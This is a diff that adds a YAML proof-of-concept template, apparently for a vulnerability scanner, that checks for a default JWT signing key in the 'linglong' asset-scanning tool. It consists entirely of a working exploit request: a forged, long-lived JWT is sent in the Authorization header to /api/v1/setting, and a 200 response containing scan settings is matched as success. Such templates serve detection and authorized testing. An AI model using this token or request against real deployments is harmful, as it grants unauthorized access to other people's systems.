@@ -1,0 +1,21 @@
+id: poc-yaml-linglong-default-jwt-token
+info:
+  name: linglong 默认JWT密钥漏洞
+  severity: high
+  tags:
+  - 硬编码凭据
+  finger: linglong
+requests:
+- method: GET
+  path: /api/v1/setting?ip=&port=&pagenum=1&pagesize=10
+  headers:
+    Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imxpbmdsb25nIiwicGFzc3dvcmQiOiJ0ZXN0IiwiZXhwIjo0ODQzMzM3NTUxLCJpc3MiOiJsaW5nbG9uZyJ9.cJgsk7Csa4VVFAy8qAfW-nysZl8_ic_M87pYA-etLZ4
+  expression: 'status_code == 200 &&
+
+    contains(body, "\"masscan_thred\"") && contains(body, "\"code\":200") &&
+
+    !contains(body, "<")
+
+    '
+variables: {}
+transport: http
